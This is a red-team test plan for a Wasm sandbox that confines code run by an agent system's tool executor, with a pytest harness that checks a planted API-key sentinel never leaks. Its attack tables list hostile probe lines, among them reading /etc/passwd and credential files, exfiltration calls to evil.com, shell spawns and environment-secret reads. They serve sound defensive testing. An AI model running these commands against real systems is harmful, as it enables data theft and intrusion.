# Wasm sandbox adversarial red-team plan (2026-04-22)

> **Status:** test plan, not yet executed. Executes once the bundled Wasm component (P0.4 follow-up item B) lands. Writing it now so the implementation doesn't drift from the threat model.

Scope: adversarial verification that code executed inside the sandbox (Wasm component loaded by `ToolExecutor`) cannot escape to host resources. The sandbox's declared guarantees — deny-by-default filesystem, no network, no subprocess, no env-var inheritance — must hold against every attack in this corpus.

Out of scope: the typed-tools library's own attack surface (covered by `test_typed_repo_redteam.py`, 47 tests shipped in commit `ef2100b`). This document is strictly about the Wasm sandbox layer under `validate_and_execute` + `execute_raw` + any future direct-Python-eval path.

---

## 1. Threat model anchored to the bundled component

The expected substrate: `rustpython.wasm` (RustPython interpreter compiled to `wasm32-wasip1` with `freeze-stdlib`) loaded via `wasmtime::Module` + `wasmtime_wasi::WasiCtxBuilder::new()` with **zero** capabilities added.

Baseline WASI-preview1 denials when no capability is granted:
* No `fd_read` / `fd_write` on any fd other than 0/1/2 (inherited stdin/stdout/stderr)
* No `path_open` — cannot open ANY file
* No `sock_*` — cannot open sockets
* No `environ_get` — env is empty from the component's point of view
* No `proc_exec` / subprocess spawn
* No `clock_time_get` on REALTIME (restricted to MONOTONIC if explicitly granted)

The Rust wiring MUST NOT call any `.inherit_*()` on `WasiCtxBuilder` beyond `inherit_stdout()` + `inherit_stderr()`. Any accidental `inherit_env()`, `preopen_dir()`, or `inherit_network()` breaks the whole model.

## 2. Attack corpus (one test per scenario)

### 2.1 Filesystem read escape

| # | Attack | Expected |
|---|--------|----------|
| FS-1 | `open("/etc/passwd").read()` | OSError — path_open denied |
| FS-2 | `open("/proc/self/environ").read()` | OSError |
| FS-3 | `open("C:/Windows/System32/config/SAM").read()` | OSError |
| FS-4 | Relative path `open("../../../../etc/passwd")` | OSError |
| FS-5 | `os.listdir("/")` | OSError |
| FS-6 | Arbitrary filedescriptor probe `os.fdopen(3, "r")` | OSError — fd not open |
| FS-7 | `pathlib.Path("/").iterdir()` | OSError |
| FS-8 | Long path traversal `open("a" * 10000)` | Any error (must NOT crash wasmtime) |

Assertion pattern: the test passes code like `"""try: open('/etc/passwd').read()\nexcept Exception as e: print(type(e).__name__)"""`; the captured stdout MUST contain `OSError` (or `PermissionError`, `FileNotFoundError`). The string content of `/etc/passwd` MUST NOT appear.

### 2.2 Filesystem write escape

| # | Attack | Expected |
|---|--------|----------|
| FW-1 | `open("/tmp/pwn", "w").write("x")` | OSError |
| FW-2 | `open("output.txt", "w").write("x")` | OSError (cwd not preopened) |
| FW-3 | `os.mkdir("/tmp/evil")` | OSError |
| FW-4 | `shutil.copyfile("/etc/passwd", "stolen")` | OSError |
| FW-5 | Write-via-socket-API fallback (`fcntl.fcntl(...)` etc.) | OSError / NotImplementedError |

### 2.3 Network egress

| # | Attack | Expected |
|---|--------|----------|
| NET-1 | `urllib.request.urlopen("http://evil.com/exfil")` | URLError / OSError |
| NET-2 | `socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("evil.com", 80))` | OSError |
| NET-3 | `http.client.HTTPConnection("evil.com").request("GET", "/")` | Any network-related error |
| NET-4 | DNS probe `socket.gethostbyname("evil.com")` | OSError |
| NET-5 | Raw fd `socket.socket(fileno=3)` | OSError |

### 2.4 Subprocess / process spawn

| # | Attack | Expected |
|---|--------|----------|
| PROC-1 | `os.system("curl evil")` | NotImplementedError / OSError |
| PROC-2 | `subprocess.run(["ls"])` | NotImplementedError |
| PROC-3 | `os.fork()` | NotImplementedError |
| PROC-4 | `os.execv("/bin/sh", [])` | NotImplementedError |

### 2.5 Environment / secrets

| # | Attack | Expected |
|---|--------|----------|
| ENV-1 | `os.environ.get("OPENAI_API_KEY")` | None or empty (empty env seen by component) |
| ENV-2 | `os.environ.items()` | Zero items |
| ENV-3 | `os.getenv("PATH")` | None |

Pre-test setup: the HOST process sets `OPENAI_API_KEY=sk-sentinel` etc. **before** spawning the component. Post-test assertion: the sentinel string never appears anywhere in captured stdout/stderr.

### 2.6 Clock / time leaks

| # | Attack | Expected |
|---|--------|----------|
| CLK-1 | `time.time()` | Either raises OR returns MONOTONIC clock value (not REALTIME wall clock) |
| CLK-2 | `datetime.datetime.now()` | Same as CLK-1 |

(Not a critical security issue — wall-clock leaks are low-severity — but tracked to ensure we don't accidentally grant `inherit_stdio()` which pulls in clocks.)

### 2.7 Memory / resource exhaustion

| # | Attack | Expected |
|---|--------|----------|
| MEM-1 | `x = [0] * (10 ** 9)` | MemoryError (wasmtime memory limit) OR wasm trap — must NOT exhaust host RAM |
| MEM-2 | Deep recursion `def f(): f()\nf()` | RecursionError or wasm stack overflow — must NOT segfault host |
| MEM-3 | `while True: pass` (infinite loop) | Times out via `timeout_secs` wasmtime epoch — must NOT hang the host indefinitely |
| MEM-4 | Fork-bomb-equivalent `import threading` + many threads | NotImplementedError (threading disabled in wasm32-wasip1) |

### 2.8 Introspection + host-bridge probing

| # | Attack | Expected |
|---|--------|----------|
| INTRO-1 | `import sys; sys.modules["wasmtime"]` | KeyError — no host module imported |
| INTRO-2 | `ctypes.CDLL("libc.so.6")` | OSError (no preloaded libs) |
| INTRO-3 | `builtins.__import__("os", fromlist=["*"])` — attempt to reach a hidden `os` | Whatever os modules ARE available must all reject filesystem ops |
| INTRO-4 | `__builtins__.__dict__["open"]` — same as above |
| INTRO-5 | Attempt to read WASI imports from Python side (`wasi.fd_read` etc.) | ModuleNotFoundError — no wasi module in sandbox stdlib |

### 2.9 Engine-level protections

| # | Attack | Expected |
|---|--------|----------|
| ENG-1 | `sys.exit(0)` from user code | Clean ExecResult exit_code=0 (NOT a wasmtime panic) |
| ENG-2 | `sys.exit(42)` | ExecResult exit_code=42 |
| ENG-3 | Unicode code that prints embedded null bytes | Captured in stdout as-is, no buffer overflow |
| ENG-4 | Very large stdout (10 MiB of print) | Capped at `MAX_TEST_OUTPUT_BYTES`, truncation marker appended |

---

## 3. Test harness shape

Python-side driver (`sage-python/tests/test_wasm_sandbox_redteam.py`):

```python
import pytest
import sage_core

# Skip everything if the sandbox wasn't compiled or the bundled
# component failed to load. Red-team is meaningless otherwise.
pytest.importorskip("sage_core")
executor = sage_core.ToolExecutor(None, 10)
if not executor.has_wasm():
    pytest.skip("Wasm component not bundled in this build", allow_module_level=True)

# Host sets sentinel BEFORE loading the component so the test catches
# env leaks from the bundled runtime state, not from this process.
SENTINEL = "sk-sentinel-do-not-leak"

def probe_denied(code: str, expected_marker: str, forbidden: str = SENTINEL):
    """Run `code` in the Wasm sandbox (opt-in via env); assert the
    expected-marker appears and the forbidden secret does NOT."""
    import os
    os.environ["SAGE_UNSAFE_RAW_EXEC"] = "1"
    os.environ["OPENAI_API_KEY"] = forbidden
    try:
        r = executor.execute_raw(code, "{}")
    finally:
        os.environ.pop("SAGE_UNSAFE_RAW_EXEC", None)
    assert forbidden not in r.stdout
    assert forbidden not in r.stderr
    assert expected_marker in r.stdout + r.stderr, (
        f"expected {expected_marker!r} in captured output; got "
        f"stdout={r.stdout!r} stderr={r.stderr!r}"
    )
```

Each attack in §2 becomes one `probe_denied(code, expected_marker)` call. Parametrize the classes so failures pinpoint which category regressed.

---

## 4. Pass criteria

* **Every attack in §2 must be blocked** — the offending syscall returns an error; the captured output proves the sandbox intercepted it.
* **Zero SENTINEL leak** across all tests' stdout + stderr. Even if a syscall is DENIED, a bug that pipes the env into the component would leak the sentinel. This catches wiring regressions.
* **Wasmtime doesn't panic or segfault** on any adversarial input (including MEM-1, MEM-2, very long regex in code, etc.).
* **Timeouts fire cleanly** — MEM-3 (infinite loop) terminates within `timeout_secs + epsilon`, no hanging workers.

## 5. Decision gate

Only after all red-team tests pass, AND a paired SWE-bench smoke (typed-only vs bash) shows pass-rate parity within ±2 pp, do we:

1. Flip `AgentConfig.dangerous_tools` default in `boot_agent_system()` from `True` to `False`.
2. Delete the `execute_bash` registration branch from boot.py (keep `Tool` definition for opt-in callers that explicitly register it).
3. Remove the `SAGE_UNSAFE_UNSANDBOXED` opt-in — with a bundled component + validated pass-rate, there's no reason to fall back to unsandboxed subprocess.
4. Flip `sandbox` into Cargo default features.
5. Publish an ADR explaining the hardened runtime contract so downstream users know what changed.

## 6. Known limits + follow-ups

* **wasm32-wasip1 threading** is not supported — tests assert NotImplementedError for `threading`, `multiprocessing`. A future move to `wasm32-wasip2 + threads` would change this; the red-team plan would need a concurrency-attack section added.
* **RustPython ≠ CPython** — some attacks that require CPython-only semantics (C extension modules, advanced ctypes) won't be testable because RustPython doesn't implement them. We add a blanket "no C extension loading" assertion (INTRO-2) and document the rest as "don't apply to this runtime".
* **Pyodide / Emscripten Python** is NOT used — Pyodide targets the browser Wasm runtime and assumes a JS host. Our runtime is wasmtime server-side; only WASI-compliant Python builds are candidates. This is why the spec chose RustPython over componentize-py (1 GB size dealbreaker).

---

## 7. Changelog

* 2026-04-22: Plan written. Executes after the bundled component lands.
